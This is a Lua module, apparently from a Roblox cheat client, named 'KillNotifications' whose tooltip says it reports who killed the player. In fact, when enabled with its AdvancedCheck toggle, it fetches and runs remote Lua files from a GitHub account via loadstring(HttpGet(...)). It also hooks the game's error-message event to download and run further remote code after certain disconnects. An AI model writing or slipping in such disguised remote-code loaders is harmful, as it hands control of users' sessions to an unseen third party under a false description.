local KillNotifications

KillNotifications = vape.Categories.Render:CreateModule({
	Name = 'KillNotifications',
	Function = function(callback)
		if callback then
            if AdvancedCheck.Enabled then
				if KillAura.Enabled then
					KillAura:Toggle()
					loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/forsureyoudont.lua'))()
					KillNotifications:Clean(guiService.ErrorMessageChanged:Connect(function(str)
						if (guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectLuaKick) and guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectConnectionLost then
							loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
						end
					end))
				else
					loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/forsureyoudont.lua'))()
					KillNotifications:Clean(guiService.ErrorMessageChanged:Connect(function(str)
						if (guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectLuaKick) and guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectConnectionLost then
							loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
						end
					end))
				end
            end
		end
	end,
	Tooltip = 'Sends a notification of who killed you.'
})


AdvancedCheck = KillNotifications:CreateToggle({
	Name = 'AdvancedCheck',
	Default = false
})